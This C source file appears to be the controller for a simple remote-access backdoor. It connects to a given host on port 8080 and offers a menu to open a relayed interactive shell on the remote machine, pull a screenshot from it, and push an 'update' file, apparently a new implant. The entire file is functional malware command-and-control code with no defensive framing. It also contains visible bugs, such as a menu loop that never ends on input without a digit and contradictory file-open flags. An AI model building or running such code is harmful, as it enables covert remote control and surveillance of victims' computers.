//FILE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
//NETWORK
#include<sys/socket.h>
#include<arpa/inet.h>
#include <unistd.h>

//UTIL
#include<stdio.h>
#include<string.h>
#include <netdb.h>
#include <stdlib.h>

extern int h_errno;

#define BUF_SIZE 255


char* read_input() {
	char* in =  malloc(sizeof(char) * BUF_SIZE);
	if (fgets(in, BUF_SIZE, stdin) == NULL) {
		exit(1);
	}
	//printf("%s",in);
	return in;
}

int get_screenshot(int fd, int socket_desc)
{

	char buffer[BUF_SIZE];
	int n = 0;
	while((n = read(socket_desc, buffer, BUF_SIZE)) > 0){
		if(write(fd, buffer , n) < 0){
			perror("receive _failed");
			return 0;
		}
	}
	printf("Data Received\n");
	close(socket_desc);
	return 1;
}



void handle_shell(int socket) {
	if(fork() == 0){
		char car;
		while(1) {
			read(0, &car, sizeof(char));
			write(socket, &car, sizeof(char));
		}
	} else {
		FILE *file = fdopen(socket, "r");
		char buf[BUF_SIZE];
		while(fgets(buf, BUF_SIZE, file) != NULL){
			printf("%s", buf);
			fflush(stdout);
		}
		exit(1);
	}
}

void send_update(int socket){
	int fd = open("update", O_RDONLY);
	if(fd < 0){
		perror("update");
		exit(1);
	}
	get_screenshot(socket, fd);	
}

void interact(int socket) {

	printf("---MENU---\n1: SHELL\n2: SCREENSHOT\n3: UPDATE\n---FIN---\n");
	char *input = read_input();
	int choix = 0; 

	while ( choix == 0) {

		int i;

		for( i = 0; i < 4; i++) {
			if ( strchr(input, i + '0') != NULL) {
				choix = i;
			}
		}
	}
	write(socket, input, BUF_SIZE); 
	free(input); 
	int fd;
	switch(choix) {

		case 1 : handle_shell(socket);
			 break;
		case 2: 
			 fd = open("screenshot.png", O_CREAT | O_WRONLY | O_RDONLY, 0666);
			 if(fd < 0){
				 perror("file: ");
				 exit(1);
			 }
			 get_screenshot(fd, socket);
			 break;
		case 3:
			send_update(socket);
		break;
	}
}



int connect_to_server(char *hostname){
	int socket_desc;
	struct sockaddr_in server;

	//Create socket
	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
	if (socket_desc == -1)
	{
		printf("Could not create socket");
		exit(1);
	}
	struct hostent *he = gethostbyname(hostname);	
	memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);	
	server.sin_family = AF_INET;
	server.sin_port = htons(8080);

	//Connect to remote server
	if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		perror("connect error");
		exit(1);
	}
	printf("Connected\n");
	return socket_desc;
}

int main(int argc, char **argv) {
	char *host;
	if(argc > 1)
		host = argv[1];
	else
		host = "localhost";
	interact(connect_to_server(host));   
	return 0;
}
